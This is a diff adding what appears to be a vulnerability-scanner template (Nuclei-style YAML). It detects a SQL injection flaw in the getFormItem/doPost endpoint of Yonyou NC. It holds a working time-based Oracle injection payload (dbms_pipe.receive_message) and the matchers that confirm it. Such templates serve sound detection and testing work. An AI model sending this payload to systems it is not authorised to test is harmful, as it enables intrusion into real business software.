@@ -1,0 +1,30 @@
+id: yonyou-nc-getformitem-sqli
+
+info:
+  name: 用友NC getFormItem doPost SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友NC系统 `/portal/pt/servlet/getFormItem/doPost` 接口存在SQL注入漏洞，攻击者可利用此漏洞执行任意SQL命令。
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://www.yonyou.com
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1')+AND+1=dbms_pipe.receive_message('RDS',3)--"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
+      Content-Length: "19"
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+          - "status_code == 200"
+        condition: and
+      - type: word
+        words:
+          - "<FormItems"
+        condition: and
